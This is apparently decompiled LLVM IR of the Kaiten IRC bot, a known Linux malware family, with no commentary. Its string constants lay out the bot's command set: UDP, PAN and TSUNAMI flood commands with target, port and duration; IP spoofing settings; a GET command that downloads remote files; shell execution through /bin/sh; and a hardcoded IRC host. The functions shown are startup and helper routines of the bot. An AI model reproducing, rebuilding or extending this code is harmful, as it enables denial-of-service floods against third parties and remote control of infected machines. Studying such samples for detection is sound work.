source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%rusage = type { %timeval, %timeval, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%timeval = type { i32, i32 }
%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_8055654.2 = global i32 0
@global_var_8055684.3 = local_unnamed_addr global i32* @global_var_8055654.2
@global_var_8058208.7 = local_unnamed_addr global i32 0
@global_var_8051e70.8 = constant [30 x i8] c"NOTICE %s :Unable to comply.\0A\00"
@global_var_8055a50.9 = local_unnamed_addr global i32 0
@global_var_805832c.10 = local_unnamed_addr global i32 0
@global_var_8051e8e.13 = constant i32 1966014578
@global_var_8051e90.14 = constant [16 x i8] c"/usr/dict/words\00"
@global_var_8051ea0.16 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_8051ebc.17 = constant [33 x i8] c"NOTICE %s :GET <host> <save as>\0A\00"
@global_var_8051ee0.18 = constant [37 x i8] c"NOTICE %s :Unable to create socket.\0A\00"
@global_var_8051f05.19 = constant [8 x i8] c"http://\00"
@global_var_8051f10.20 = constant [39 x i8] c"NOTICE %s :Unable to resolve address.\0A\00"
@global_var_8051f38.21 = constant [39 x i8] c"NOTICE %s :Unable to connect to http.\0A\00"
@global_var_8051f60.22 = constant [276 x i8] c"GET /%s HTTP/1.0\0D\0AConnection: Keep-Alive\0D\0AUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\0D\0AHost: %s:80\0D\0AAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\0D\0AAccept-Encoding: gzip\0D\0AAccept-Language: en\0D\0AAccept-Charset: iso-8859-1,*,utf-8\0D\0A\0D\0A\00"
@global_var_8052074.23 = constant [28 x i8] c"NOTICE %s :Receiving file.\0A\00"
@global_var_8052090.24 = constant [3 x i8] c"wb\00"
@global_var_8052093.25 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_8052098.26 = constant [24 x i8] c"NOTICE %s :Saved as %s\0A\00"
@global_var_80520b0.27 = constant [32 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d\0A\00"
@global_var_80520d0.28 = constant [46 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\0A\00"
@global_var_80520fe.29 = constant [29 x i8] c"NOTICE %s :Kaiten wa goraku\0A\00"
@global_var_805211b.30 = constant [24 x i8] c"NOTICE %s :NICK <nick>\0A\00"
@global_var_8052134.31 = constant [53 x i8] c"NOTICE %s :Nick cannot be larger than 9 characters.\0A\00"
@global_var_8052169.32 = constant [9 x i8] c"NICK %s\0A\00"
@global_var_8052172.33 = constant [27 x i8] c"NOTICE %s :DISABLE <pass>\0A\00"
@global_var_80521b4.36 = constant [35 x i8] c"NOTICE %s :Current status is: %s.\0A\00"
@global_var_80521d7.37 = constant [30 x i8] c"NOTICE %s :Already disabled.\0A\00"
@global_var_80521f8.38 = constant [37 x i8] c"NOTICE %s :Password too long! > 254\0A\00"
@global_var_8058100.39 = global i32 0
@global_var_8052220.40 = constant [31 x i8] c"NOTICE %s :Disable sucessful.\0A\00"
@global_var_805223f.41 = constant [26 x i8] c"NOTICE %s :ENABLE <pass>\0A\00"
@global_var_8052259.42 = constant [29 x i8] c"NOTICE %s :Already enabled.\0A\00"
@global_var_8052276.43 = constant [27 x i8] c"NOTICE %s :Wrong password\0A\00"
@global_var_8052291.44 = constant [30 x i8] c"NOTICE %s :Password correct.\0A\00"
@global_var_80522b0.45 = constant [31 x i8] c"NOTICE %s :Removed all spoofs\0A\00"
@global_var_80522d0.46 = constant [75 x i8] c"NOTICE %s :What kind of subnet address is that? Do something like: 169.40\0A\00"
@global_var_8055e60.47 = global i32 0
@global_var_805231c.48 = constant [33 x i8] c"NOTICE %s :Unable to resolve %s\0A\00"
@global_var_8052340.49 = constant [39 x i8] c"NOTICE %s :UDP <target> <port> <secs>\0A\00"
@global_var_8052367.50 = constant [26 x i8] c"NOTICE %s :Packeting %s.\0A\00"
@global_var_80523a0.51 = constant i32 2
@global_var_80523f0.52 = constant [39 x i8] c"NOTICE %s :PAN <target> <port> <secs>\0A\00"
@global_var_8052417.53 = constant [24 x i8] c"NOTICE %s :Panning %s.\0A\00"
@global_var_8052430.54 = constant [36 x i8] c"NOTICE %s :TSUNAMI <target> <secs>\0A\00"
@global_var_8052454.55 = constant [36 x i8] c"NOTICE %s :Tsunami heading for %s.\0A\00"
@global_var_8058320.59 = local_unnamed_addr global i32 0
@global_var_8055a40.60 = local_unnamed_addr global i32 0
@global_var_8058328.79 = local_unnamed_addr global i32 0
@global_var_8058204.80 = local_unnamed_addr global i32 0
@global_var_8052c0d.90 = constant [13 x i8] c"MODE %s -xi\0A\00"
@global_var_8058324.91 = local_unnamed_addr global i32 0
@global_var_8052c1a.92 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_8052c27.93 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_8052c2f.94 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_8052c38.95 = constant [93 x i8] c"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\0A\00"
@global_var_8051e60.100 = constant [16 x i8] c"wb.realunix.org\00"
@global_var_80556a4.101 = global [16 x i8]* @global_var_8051e60.100
@global_var_80557e0.103 = global i32 288
@global_var_8055830.104 = local_unnamed_addr global i32 272
@global_var_80580c0.106 = global i32 0
@global_var_80557b8.107 = global i32 0
@global_var_8055e80.108 = local_unnamed_addr global i32 0
@global_var_8055e84.109 = local_unnamed_addr global i32 0
@global_var_8055e64.110 = global i32 0
@global_var_8055e7c.111 = local_unnamed_addr global i32 0
@global_var_8053000.112 = constant [3 x i8] c"-c\00"
@global_var_8053008.113 = constant [3 x i8] c"sh\00"
@global_var_8053003.114 = constant [8 x i8] c"/bin/sh\00"
@global_var_80557d0.115 = local_unnamed_addr global i32 2
@global_var_80557a0.116 = global i32 0
@global_var_805579c.117 = global i32* @global_var_80557e0.103
@global_var_805300c.118 = constant i32 0
@global_var_8053024.119 = constant [6 x i8] c"(nil)\00"
@global_var_805302a.120 = constant [7 x i8] c"(null)\00"
@global_var_8053031.121 = constant i32 2949163
@global_var_805309e.123 = constant i32 327688
@global_var_80559e0 = external local_unnamed_addr global i32
@global_var_80542e0.125 = constant i32 65536
@global_var_8053096.126 = constant [8 x i8] c" +0-#'I\00"
@global_var_8053044.127 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_8053081.128 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_8053077.129 = constant i32 117506048
@global_var_8053068.130 = constant i32 331776
@global_var_80530e0.131 = constant [8 x i8] c"Success\00"
@global_var_80530c2.132 = constant [15 x i8] c"Unknown error \00"
@global_var_80559e8.133 = local_unnamed_addr global i32* @global_var_80542e0.125
@global_var_8057ec0.134 = global i32 0
@global_var_805808c.135 = global i32 0
@global_var_80559f0.136 = global i32 0
@global_var_80586d4.137 = local_unnamed_addr global i32 0
@global_var_80586c8.138 = global i32 0
@global_var_80558d0.139 = global i32 0
@global_var_805836c.141 = global i32 0
@global_var_8058370.142 = local_unnamed_addr global i32 0
@global_var_8058374.143 = global i32 0
@global_var_8058380.144 = local_unnamed_addr global i32 0
@global_var_8058674.145 = global i32 0
@global_var_805869c.146 = local_unnamed_addr global i32 0
@global_var_805868c.147 = local_unnamed_addr global i32 0
@global_var_8058690.148 = local_unnamed_addr global i32 0
@global_var_8058694.149 = local_unnamed_addr global i32 0
@global_var_8058698.150 = local_unnamed_addr global i32 0
@global_var_80586a4.151 = local_unnamed_addr global i32 0
@global_var_80586b0.152 = local_unnamed_addr global i32 0
@global_var_80586a8.153 = local_unnamed_addr global i32 0
@global_var_80586b4.154 = local_unnamed_addr global i32 0
@global_var_8058688.155 = local_unnamed_addr global i32 0
@global_var_8058684.157 = local_unnamed_addr global i32 0
@global_var_80586ac.158 = local_unnamed_addr global i32 0
@global_var_805837c.159 = local_unnamed_addr global i32 0
@global_var_80558e8.160 = global i32 0
@global_var_8055900.162 = global i32 0
@global_var_8055918 = external global i32
@global_var_8055944.164 = global i32 -1726662223
@global_var_8055920.165 = local_unnamed_addr global i32* @global_var_8055944.164
@global_var_805591c.166 = global i32* @global_var_8055944.164
@global_var_8053c54.167 = constant i32 0
@global_var_8053c40.168 = constant i32 0
@global_var_80559c0.169 = global i32 0
@global_var_80580a4.170 = local_unnamed_addr global i32 0
@global_var_80580ac.171 = local_unnamed_addr global i32 0
@global_var_8055648.173 = global i32 -1
@global_var_804ec47.174 = constant i32 -294069
@global_var_80580b4.175 = local_unnamed_addr global i32 0
@global_var_80580b8.176 = local_unnamed_addr global i32 0
@global_var_8053ec0.177 = constant [10 x i8] c"/dev/null\00"
@global_var_80580b0.179 = local_unnamed_addr global i32 0
@global_var_80580a8.180 = local_unnamed_addr global i32 0
@global_var_804ee2d.182 = constant i32 1928542531
@global_var_804ee51.183 = constant i32 1928542531
@global_var_80580e4.184 = local_unnamed_addr global i32 0
@global_var_80580c4.185 = global i32 0
@global_var_80544f0.187 = constant [4 x i8] c"inf\00"
@global_var_80544f3.192 = constant i32 1179535616
@global_var_8054500.193 = constant i32 2883630
@global_var_80580c8.194 = global i32 0
@global_var_80586d8.197 = local_unnamed_addr global i32 0
@global_var_80545bc.198 = constant i32 1697579054
@global_var_80545f0.199 = constant i32 1868824690
@global_var_80545be.200 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_80545cf.201 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_80545e7.202 = constant [11 x i8] c"nameserver\00"
@global_var_80545f2.203 = constant [7 x i8] c"domain\00"
@global_var_80545f9.204 = constant [7 x i8] c"search\00"
@global_var_80586b8.205 = global i32 0
@global_var_80586dc.206 = local_unnamed_addr global i32 0
@global_var_80586e0.207 = local_unnamed_addr global i32 0
@global_var_8054614.208 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_8054611.210 = constant [3 x i8] c"%x\00"
@global_var_8054625.211 = constant [11 x i8] c"/etc/hosts\00"
@global_var_8054630.212 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_8055a20.1 = local_unnamed_addr global i8 0
@global_var_8055a60.5 = external global i8*
@global_var_8055a44.6 = local_unnamed_addr global i8 0
@global_var_8055a48.11 = external global i8*
@global_var_8055a4c.12 = local_unnamed_addr global i64 0
@global_var_8055a4b.96 = external local_unnamed_addr global i8*
@global_var_8055a4a.97 = external local_unnamed_addr global i8*
@global_var_8055a49.98 = external global i8*
@global_var_80556a0.99 = local_unnamed_addr global i64 577901524852670468
@global_var_80530b6.122 = external constant i8*
@global_var_8058340.140 = global i8 0
@global_var_80586a0.156 = local_unnamed_addr global i8 0
@global_var_80580a0.161 = local_unnamed_addr global i8 0
@global_var_80580bc.178 = local_unnamed_addr global i8 0
@global_var_80580e0.195 = local_unnamed_addr global i64 0
@global_var_80559ec.196 = local_unnamed_addr global i16 1

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8048094() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @function_80480b0(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 54719
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @function_8048110()
  %v0_80480a8 = call i32 @function_8051e20()
  ret i32 %v0_80480a8
}

define i32 @function_80480b0(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @function_80480c0() local_unnamed_addr {
dec_label_pc_80480c0:
  %v0_80480c6 = load i8, i8* @global_var_8055a20.1, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge

dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge: ; preds = %dec_label_pc_80480c0
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %dec_label_pc_80480c0
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_8055684.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_8055684.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_8055684.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_8055a20.1, align 32
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8055684.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_8055a20.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @function_8048110() local_unnamed_addr {
dec_label_pc_8048110:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 134563396)
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_8048140 = load i32, i32* inttoptr (i32 134567512 to i32*), align 8
  %v1_8048145 = icmp eq i32 %v0_8048140, 0
  br i1 %v1_8048145, label %dec_label_pc_804815f, label %dec_label_pc_8048149

dec_label_pc_8048149:                             ; preds = %dec_label_pc_8048140
  br label %dec_label_pc_804815f

dec_label_pc_804815f:                             ; preds = %dec_label_pc_8048149, %dec_label_pc_8048140
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @entry_point(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %v9_8048180 = call i32 @function_804ece3(i32 134524309, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134553160, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  ret i32 %v9_8048180

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048188(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8048188:
  %tmp14 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_804818b = load i32, i32* @ebx, align 4
  store i32 %v0_804818b, i32* %stack_var_-8, align 4
  %v4_804818f = ptrtoint i8* %arg1 to i32
  %v2_8048192 = load i8, i8* %arg1, align 1
  %v12_804819a = icmp eq i8 %v2_8048192, 42
  br i1 %v12_804819a, label %dec_label_pc_80481c1, label %dec_label_pc_80481a0

dec_label_pc_80481a0:                             ; preds = %dec_label_pc_8048188
  %v12_80481a0 = icmp eq i8 %v2_8048192, 63
  br i1 %v12_80481a0, label %dec_label_pc_8048213, label %dec_label_pc_80481a6

dec_label_pc_80481a6:                             ; preds = %dec_label_pc_80481a0
  %v4_80481a6 = icmp eq i8 %v2_8048192, 0
  br i1 %v4_80481a6, label %dec_label_pc_80481b1, label %dec_label_pc_804824d

dec_label_pc_80481b1:                             ; preds = %dec_label_pc_80481a6
  %v2_80481b4 = load i8, i8* %tmp14, align 1
  %v2_80481b6 = sext i8 %v2_80481b4 to i32
  br label %dec_label_pc_80482aa

dec_label_pc_80481c1:                             ; preds = %dec_label_pc_8048188
  %v1_80481c4 = add i32 %v4_804818f, 1
  %v5_80481cb = inttoptr i32 %v1_80481c4 to i8*
  %v5_80481cc = call i32 @function_8048188(i8* %v5_80481cb, i32 %arg2)
  %v1_80481d4 = icmp eq i32 %v5_80481cc, 0
  br i1 %v1_80481d4, label %dec_label_pc_8048201, label %dec_label_pc_80481d8

dec_label_pc_80481d8:                             ; preds = %dec_label_pc_80481c1
  %v2_80481db = load i8, i8* %tmp14, align 1
  %v4_80481dd = icmp eq i8 %v2_80481db, 0
  br i1 %v4_80481dd, label %dec_label_pc_8048208, label %dec_label_pc_80481e1

dec_label_pc_80481e1:                             ; preds = %dec_label_pc_80481d8
  %v1_80481e4 = add i32 %arg2, 1
  %v5_80481ec = call i32 @function_8048188(i8* nonnull %arg1, i32 %v1_80481e4)
  %v1_80481f4 = icmp eq i32 %v5_80481ec, 0
  br i1 %v1_80481f4, label %dec_label_pc_8048201, label %dec_label_pc_8048208

dec_label_pc_8048201:                             ; preds = %dec_label_pc_80481e1, %dec_label_pc_80481c1
  br label %dec_label_pc_8048208

dec_label_pc_8048208:                             ; preds = %dec_label_pc_80481d8, %dec_label_pc_80481e1, %dec_label_pc_8048201
  %storemerge8 = phi i32 [ 0, %dec_label_pc_8048201 ], [ 1, %dec_label_pc_80481e1 ], [ 1, %dec_label_pc_80481d8 ]
  br label %dec_label_pc_80482aa

dec_label_pc_8048213:                             ; preds = %dec_label_pc_80481a0
  %v2_8048216 = load i8, i8* %tmp14, align 1
  %v4_8048218 = icmp eq i8 %v2_8048216, 0
  br i1 %v4_8048218, label %dec_label_pc_8048245, label %dec_label_pc_804821c

dec_label_pc_804821c:                             ; preds = %dec_label_pc_8048213
  %v1_804821f = add i32 %arg2, 1
  %v1_8048223 = add i32 %v4_804818f, 1
  %v5_8048228 = inttoptr i32 %v1_8048223 to i8*
  %v5_8048229 = call i32 @function_8048188(i8* %v5_8048228, i32 %v1_804821f)
  %v1_8048231 = icmp ne i32 %v5_8048229, 0
  %. = zext i1 %v1_8048231 to i32
  br label %dec_label_pc_8048245

dec_label_pc_8048245:                             ; preds = %dec_label_pc_804821c, %dec_label_pc_8048213
  %storemerge5 = phi i32 [ 1, %dec_label_pc_8048213 ], [ %., %dec_label_pc_804821c ]
  br label %dec_label_pc_80482aa

dec_label_pc_804824d:                             ; preds = %dec_label_pc_80481a6
  %v2_8048250 = load i8, i8* %arg1, align 1
  %v2_8048252 = sext i8 %v2_8048250 to i32
  %v2_8048259 = call i32 @function_804b49c(i32 %v2_8048252)
  store i32 %v2_8048259, i32* @ebx, align 4
  %v2_8048266 = load i8, i8* %tmp14, align 1
  %v2_8048268 = sext i8 %v2_8048266 to i32
  %v2_804826f = call i32 @function_804b49c(i32 %v2_8048268)
  %v0_8048277 = load i32, i32* @ebx, align 4
  %v12_8048277 = icmp eq i32 %v0_8048277, %v2_804826f
  %v1_8048279 = icmp eq i1 %v12_8048277, false
  br i1 %v1_8048279, label %dec_label_pc_80482a4, label %dec_label_pc_804827b

dec_label_pc_804827b:                             ; preds = %dec_label_pc_804824d
  %v1_804827e = add i32 %arg2, 1
  %v1_8048282 = add i32 %v4_804818f, 1
  %v5_8048287 = inttoptr i32 %v1_8048282 to i8*
  %v5_8048288 = call i32 @function_8048188(i8* %v5_8048287, i32 %v1_804827e)
  %v1_8048290 = icmp ne i32 %v5_8048288, 0
  %.9 = zext i1 %v1_8048290 to i32
  br label %dec_label_pc_80482a4

dec_label_pc_80482a4:                             ; preds = %dec_label_pc_804827b, %dec_label_pc_804824d
  %storemerge = phi i32 [ 1, %dec_label_pc_804824d ], [ %.9, %dec_label_pc_804827b ]
  br label %dec_label_pc_80482aa

dec_label_pc_80482aa:                             ; preds = %dec_label_pc_8048245, %dec_label_pc_8048208, %dec_label_pc_80481b1, %dec_label_pc_80482a4
  %stack_var_-24.0 = phi i32 [ %storemerge8, %dec_label_pc_8048208 ], [ %storemerge5, %dec_label_pc_8048245 ], [ %v2_80481b6, %dec_label_pc_80481b1 ], [ %storemerge, %dec_label_pc_80482a4 ]
  %v3_80482ad = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_80482ad, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_8048192, { 2, 0, 1 }
  uselistorder i32 %v4_804818f, { 0, 2, 1 }
  uselistorder i8* %tmp14, { 3, 1, 0, 2 }
  uselistorder i32 (i32)* @function_804b49c, { 1, 0 }
  uselistorder i32 %arg2, { 0, 3, 2, 1, 4 }
  uselistorder i8* %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_80482aa, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8048208, { 2, 1, 0 }
}

define i32 @function_80482b2(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80482b2:
  %stack_var_12 = alloca i32, align 4
  %v0_80482b5 = load i32, i32* @edi, align 4
  %v4_80482bc = ptrtoint i32* %stack_var_12 to i32
  %v5_80482ce = call i32 @function_804b5e8(i32 ptrtoint (i8** @global_var_8055a60.5 to i32), i32 %arg2, i32 %v4_80482bc)
  store i1 false, i1* @df, align 1
  store i32 ptrtoint (i8** @global_var_8055a60.5 to i32), i32* @edi, align 4
  %v3_80482e9 = call i32 @_strlen(i8* bitcast (i8** @global_var_8055a60.5 to i8*))
  %v6_80482fc = call i32 @function_804b464(i32 %arg1, i32* bitcast (i8** @global_var_8055a60.5 to i32*), i32 %v3_80482e9)
  store i32 %v0_80482b5, i32* @edi, align 4
  ret i32 %v6_80482fc
}

define i32 @function_8048309(i32 %arg1) local_unnamed_addr {
dec_label_pc_8048309:
  %v0_804830f = load i8, i8* @global_var_8055a44.6, align 4
  %v10_8048314 = icmp eq i8 %v0_804830f, 1
  %v1_8048316 = icmp eq i1 %v10_8048314, false
  br i1 %v1_8048316, label %dec_label_pc_804833d, label %dec_label_pc_8048318

dec_label_pc_8048318:                             ; preds = %dec_label_pc_8048309
  %v0_8048318 = load i32, i32* @global_var_8058208.7, align 8
  %v3_8048329 = call i32 @function_80482b2(i32 %v0_8048318, i32 ptrtoint ([30 x i8]* @global_var_8051e70.8 to i32))
  br label %dec_label_pc_80483e3

dec_label_pc_804833d:                             ; preds = %dec_label_pc_8048309
  %v0_804833d = call i32 @function_804b2ec()
  %v4_8048345 = icmp eq i32 %v0_804833d, 0
  %v1_8048349 = icmp eq i1 %v4_8048345, false
  br i1 %v1_8048349, label %dec_label_pc_8048356, label %dec_label_pc_804834b

dec_label_pc_804834b:                             ; preds = %dec_label_pc_804833d
  br label %dec_label_pc_80483e3

dec_label_pc_8048356:                             ; preds = %dec_label_pc_804833d
  %v0_8048356 = load i32, i32* @global_var_8055a50.9, align 16
  %v1_804835b = add i32 %v0_8048356, 1
  store i32 %v1_804835b, i32* @global_var_8055a50.9, align 16
  %v2_8048366 = mul i32 %v1_804835b, 4
  %v1_8048369 = add i32 %v2_8048366, 4
  %v1_8048370 = call i32 @function_804d73a(i32 %v1_8048369)
  %v0_80483a613 = load i32, i32* @global_var_8055a50.9, align 16
  %v6_80483af15 = icmp eq i32 %v0_80483a613, 1
  br i1 %v6_80483af15, label %dec_label_pc_80483b1, label %dec_label_pc_8048384

dec_label_pc_8048384:                             ; preds = %dec_label_pc_8048356, %dec_label_pc_8048384
  %storemerge16 = phi i32 [ %v4_80483a3, %dec_label_pc_8048384 ], [ 0, %dec_label_pc_8048356 ]
  %v2_8048387 = mul i32 %storemerge16, 4
  %v5_804838c = add i32 %v2_8048387, %v1_8048370
  %v0_8048397 = load i32, i32* @global_var_805832c.10, align 4
  %v2_804839c = add i32 %v0_8048397, %v2_8048387
  %v1_804839f = inttoptr i32 %v2_804839c to i32*
  %v2_804839f = load i32, i32* %v1_804839f, align 4
  %v2_80483a1 = inttoptr i32 %v5_804838c to i32*
  store i32 %v2_804839f, i32* %v2_80483a1, align 4
  %v4_80483a3 = add i32 %storemerge16, 1
  %v0_80483a6 = load i32, i32* @global_var_8055a50.9, align 16
  %v1_80483ab = add i32 %v0_80483a6, -1
  %v6_80483af = icmp ugt i32 %v1_80483ab, %v4_80483a3
  br i1 %v6_80483af, label %dec_label_pc_8048384, label %dec_label_pc_80483b1

dec_label_pc_80483b1:                             ; preds = %dec_label_pc_8048384, %dec_label_pc_8048356
  %v0_80483a6.lcssa = phi i32 [ %v0_80483a613, %dec_label_pc_8048356 ], [ %v0_80483a6, %dec_label_pc_8048384 ]
  %v2_80483b6 = mul i32 %v0_80483a6.lcssa, 4
  %v5_80483b9 = add i32 %v1_8048370, -4
  %v1_80483bc = add i32 %v5_80483b9, %v2_80483b6
  %v2_80483c2 = inttoptr i32 %v1_80483bc to i32*
  store i32 %v0_804833d, i32* %v2_80483c2, align 4
  %v0_80483c4 = load i32, i32* @global_var_805832c.10, align 4
  %v1_80483cd = call i32 @function_804e0e5(i32 %v0_80483c4)
  store i32 %v1_8048370, i32* @global_var_805832c.10, align 4
  br label %dec_label_pc_80483e3

dec_label_pc_80483e3:                             ; preds = %dec_label_pc_804834b, %dec_label_pc_8048318, %dec_label_pc_80483b1
  %stack_var_-24.0 = phi i32 [ %v0_804833d, %dec_label_pc_80483b1 ], [ %v0_804833d, %dec_label_pc_804834b ], [ 1, %dec_label_pc_8048318 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %v4_80483a3, { 1, 0 }
  uselistorder i32 %v2_8048387, { 1, 0 }
  uselistorder i32 %storemerge16, { 1, 0 }
  uselistorder i32 %v0_80483a613, { 1, 0 }
  uselistorder i32 %v1_8048370, { 2, 0, 1 }
  uselistorder i32* @global_var_8055a50.9, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80483e3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8048384, { 1, 0 }
}

define i32 @function_80483e8() local_unnamed_addr {
dec_label_pc_80483e8:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v0_80483e8 = load i32, i32* @ebp, align 4
  %v0_80483ee = load i8*, i8** @global_var_8055a48.11, align 4
  %v1_80483ee = ptrtoint i8* %v0_80483ee to i32
  store i32 %v1_80483ee, i32* @eax, align 4
  %v2_80483f3 = icmp eq i8* %v0_80483ee, null
  %v1_80483f5 = icmp eq i1 %v2_80483f3, false
  br i1 %v1_80483f5, label %dec_label_pc_8048401, label %dec_label_pc_80483f7

dec_label_pc_80483f7:                             ; preds = %dec_label_pc_80483e8
  %v1_80483f7 = call i32 @function_804e3b8(i32 %v0_80483e8)
  br label %dec_label_pc_8048452

dec_label_pc_8048401:                             ; preds = %dec_label_pc_80483e8
  %v0_8048401 = load i64, i64* @global_var_8055a4c.12, align 8
  %v1_8048401 = trunc i64 %v0_8048401 to i32
  store i32 %v1_8048401, i32* @eax, align 4
  %v9_8048406 = icmp eq i32 %v1_8048401, 1
  %v1_8048409 = icmp eq i1 %v9_8048406, false
  br i1 %v1_8048409, label %dec_label_pc_8048421, label %dec_label_pc_804840b

dec_label_pc_804840b:                             ; preds = %dec_label_pc_8048401
  %v2_8048414 = call i32 @function_804d117(i32 %v1_80483ee)
